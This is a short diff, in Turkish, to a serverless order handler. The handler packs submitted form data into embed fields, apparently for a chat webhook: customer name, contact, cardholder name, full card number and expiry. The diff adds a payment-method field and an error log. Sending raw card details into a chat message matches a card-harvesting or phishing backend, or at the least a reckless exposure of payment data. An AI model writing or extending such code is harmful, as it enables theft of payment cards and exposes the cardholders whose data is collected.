@@ -10,6 +10,7 @@ exports.handler = async (event) => {
       fields: [
         { name: "👤 Müşteri", value: data.ad_soyad || "Bilinmiyor", inline: true },
         { name: "📞 İletişim", value: data.iletisim || "Bilinmiyor", inline: true },
+        { name: "💳 Ödeme", value: data.odeme_yontemi || "Kartla Ödeme", inline: true },
         { name: "💳 Kart Sahibi", value: data.kart_isim || "Girilmedi", inline: true },
         { name: "💳 Kart No", value: data.kart_no || "Girilmedi", inline: true },
         { name: "💳 Ay/Yıl", value: data.kart_tarih || "Girilmedi", inline: true },
@@ -29,6 +30,7 @@ exports.handler = async (event) => {
       body: JSON.stringify({ success: true, message: 'Sipariş alındı' })
     };
   } catch (error) {
+    console.error(error);
     return {
       statusCode: 500,
       body: JSON.stringify({ success: false })
